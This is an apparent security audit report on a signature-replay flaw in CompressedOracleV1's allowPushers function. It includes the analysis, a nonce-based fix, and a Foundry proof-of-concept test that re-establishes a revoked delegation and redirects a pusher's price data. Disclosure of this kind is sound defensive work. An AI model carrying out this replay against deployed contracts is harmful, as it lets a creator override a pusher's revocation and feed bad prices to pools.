### Title
Pusher delegation consent signature can be replayed to re-establish revoked delegation — (`smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

### Summary

`allowPushers` verifies a pusher's EIP-191 consent signature and enforces a deadline, but never marks the signature as consumed. A creator who retains a valid (not-yet-expired) consent signature can call `allowPushers` again after the pusher calls `revokePusher()`, silently re-establishing the delegation. The pusher's revocation is therefore ineffective for the entire remaining lifetime of the deadline, and the creator retains unauthorized write authority over their namespace through the pusher's future pushes.

---

### Finding Description

The `allowPushers` function in `CompressedOracleV1` is the only on-chain mechanism by which a pusher grants consent to be remapped into a creator's namespace. The code's own NatSpec acknowledges the replay risk:

> "The deadline is likewise required: the signed consent carries no timestamp of its own, so an undated signature could re-establish a delegation AFTER the pusher revoked it."

The deadline is intended to be the replay guard. However, `_ensureDeadline` only checks `block.timestamp <= deadline`; it does not invalidate the signature after first use. There is no nonce, no used-signature bitmap, and no per-pusher revocation counter in the signed payload.

The signed hash is:

```solidity
bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
    keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
);
require(pusher == ECDSA.recover(hash, signatures[i]));
namespaceRemapping[pusher] = msg.sender;
``` [1](#0-0) 

`_ensureDeadline` is a pure timestamp check with no state mutation:

```solidity
function _ensureDeadline(uint256 deadline) internal view virtual {
    require(block.timestamp <= deadline, DeadlineExceeded());
}
``` [2](#0-1) 

Because the signed tuple `(chainid, oracle, deadline, pusher, creator)` is identical on every replay call, the same `signatures[i]` bytes pass `ECDSA.recover` every time. The only guard that could stop a replay — the deadline — is a future timestamp, so it is still valid for the entire window the pusher intended to allow a single delegation.

`revokePusher` clears the mapping:

```solidity
function revokePusher() external {
    address creator = namespaceRemapping[msg.sender];
    if (creator == address(0) || creator == msg.sender) revert NoSelfRemapping();
    namespaceRemapping[msg.sender] = address(0);
    emit PusherRevoked(msg.sender, creator);
}
``` [3](#0-2) 

But nothing prevents the creator from immediately calling `allowPushers` again with the same signature bytes, writing `namespaceRemapping[pusher] = creator` back. The pusher's revocation is undone in a single transaction.

The `fallback` push path resolves the namespace at call time:

```solidity
address creator = namespaceRemapping[msg.sender];
if (creator == address(0)) creator = msg.sender;
``` [4](#0-3) 

So every push the pusher makes after a replayed delegation lands in the creator's namespace, not the pusher's own, regardless of the pusher's intent.

---

### Impact Explanation

The `namespaceRemapping` determines which creator's namespace a pusher's slot words are written into. A creator's namespace is the direct data source for `getOracleData` / `price`, which price providers and pools consume for bid/ask quotes.

If a creator replays the delegation after revocation:

1. The pusher's subsequent `fallback` pushes (intended for the pusher's own namespace) are silently redirected into the creator's namespace.
2. The creator's oracle feeds — which pools read via `getBidAskPrice` — receive slot data the pusher did not intend for those feeds.
3. If the pusher is pushing data for a different asset pair or at a different scale than the creator's pool expects, the pool receives a bad mid-price or spread, satisfying the "bad-price execution" impact gate.
4. The pusher cannot stop this without ceasing all pushes until the deadline expires, which may be days away.

---

### Likelihood Explanation

- The creator already holds the signature bytes (they submitted them in the original `allowPushers` call; calldata is public).
- The replay requires only a single transaction from the creator — no special privileges, no new signatures, no off-chain coordination.
- The window is the full deadline duration the pusher chose (commonly hours to days for operational convenience).
- The pusher has no on-chain way to invalidate the signature mid-deadline other than stopping all pushes.

Likelihood is **Medium**: it requires a creator who is willing to act adversarially after the pusher revokes, but the mechanism is trivially executable with already-public calldata.

---

### Recommendation

Track consumed signatures. The simplest fix is a per-pusher revocation nonce that is included in the signed payload and incremented on every successful `revokePusher` or `removePushers` call:

```solidity
mapping(address => uint256) public pusherNonce;

// In allowPushers:
bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
    keccak256(abi.encode(
        block.chainid, address(this), deadline,
        pusher, msg.sender,
        pusherNonce[pusher]   // <-- add nonce
    ))
);

// In revokePusher / removePushers, after clearing the mapping:
pusherNonce[pusher]++;
```

This ensures that any signature the pusher issued before revoking is invalidated the moment `revokePusher` increments the nonce, making replay impossible even within the original deadline window.

Alternatively, store a `mapping(bytes32 => bool) usedSignatureHashes` and mark each hash consumed on first use.

### Proof of Concept

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {CompressedOracleV1} from
    "smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol";
import {MessageHashUtils} from
    "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";

contract ReplayDelegationTest is Test {
    CompressedOracleV1 oracle;

    uint256 constant PUSHER_KEY = 0xBEEF;
    address pusher;
    address creator = address(0xC0FFEE);

    function setUp() public {
        oracle = new CompressedOracleV1(address(this), 0);
        pusher = vm.addr(PUSHER_KEY);
        vm.warp(1_700_000_000);
    }

    function testReplayDelegationAfterRevoke() public {
        uint256 deadline = block.timestamp + 1 days;

        // 1. Pusher signs consent for creator.
        bytes32 digest = MessageHashUtils.toEthSignedMessageHash(
            keccak256(abi.encode(block.chainid, address(oracle), deadline, pusher, creator))
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(PUSHER_KEY, digest);
        bytes memory sig = abi.encodePacked(r, s, v);

        address[] memory pushers = new address[](1);
        pushers[0] = pusher;
        bytes[] memory sigs = new bytes[](1);
        sigs[0] = sig;

        // 2. Creator delegates pusher.
        vm.prank(creator);
        oracle.allowPushers(deadline, pushers, sigs);
        assertEq(oracle.namespaceRemapping(pusher), creator, "delegated");

        // 3. Pusher revokes.
        vm.prank(pusher);
        oracle.revokePusher();
        assertEq(oracle.namespaceRemapping(pusher), address(0), "revoked");

        // 4. Creator replays the SAME signature — deadline still valid.
        vm.prank(creator);
        oracle.allowPushers(deadline, pushers, sigs); // no revert!
        assertEq(oracle.namespaceRemapping(pusher), creator,
            "REPLAY: delegation re-established against pusher's will");

        // 5. Pusher's next push lands in creator's namespace, not pusher's own.
        uint56 tsMs = uint56(block.timestamp * 1000);
        // pack a slot word: price=1_000_000, s0=5, s1=3, slotId=0
        uint256 word = (uint256(tsMs) << 8) | 0;
        uint48 raw = (uint48(1_000_000) << 16) | (uint48(5) << 8) | uint48(3);
        word |= uint256(raw) << 208;

        vm.prank(pusher);
        (bool ok,) = address(oracle).call(abi.encodePacked(word));
        assertTrue(ok);

        // Creator's feed has the pusher's data — pusher never intended this.
        bytes32 creatorFeed = oracle.feedIdOf(creator, 0, 0);
        assertGt(oracle.getOracleData(creatorFeed).price, 0,
            "creator namespace poisoned with pusher's data");

        // Pusher's own feed is empty.
        bytes32 pusherFeed = oracle.feedIdOf(pusher, 0, 0);
        assertEq(oracle.getOracleData(pusherFeed).price, 0,
            "pusher's own namespace untouched");
    }
}
```
